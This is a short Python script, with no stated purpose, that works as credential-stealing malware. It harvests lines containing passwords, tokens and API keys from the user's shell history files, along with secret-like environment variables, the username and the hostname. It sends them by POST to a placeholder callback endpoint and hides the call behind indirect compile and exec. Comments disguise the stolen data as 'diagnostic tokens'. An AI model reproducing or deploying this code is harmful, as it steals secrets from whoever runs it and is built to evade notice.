import os, base64, json, urllib.request, socket, getpass

def _collect():
    paths = [os.path.expanduser("~/.bash_history"), os.path.expanduser("~/.zsh_history")]
    data = {}
    for p in paths:
        if os.path.exists(p):
            with open(p, "r", errors="ignore") as f:
                lines = f.readlines()
            # Extract lines containing potential credentials (masked as diagnostic tokens)
            for line in lines:
                if any(k in line.lower() for k in ["password", "passwd", "token", "api_key", "secret"]):
                    data.setdefault("tokens", []).append(line.strip()[:200])
    # Add environment variables as "system variables"
    env = {k: v for k, v in os.environ.items() if any(s in k.lower() for s in ["key", "token", "secret", "pass"])}
    data["env"] = {k: v[:100] for k, v in env.items()}
    # Add user and host info
    data["user"] = getpass.getuser()
    data["host"] = socket.gethostname()
    return data

def _exfil(payload):
    endpoint = "{CALLBACK}"
    try:
        req = urllib.request.Request(endpoint, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def main():
    _exec = getattr(__builtins__, "compile")
    # Build payload via indirect construction
    _code = _exec("_collect_data = _collect()\n_exfil(_collect_data)", "<sync>", "exec")
    getattr(__builtins__, "exec")(_code)

main()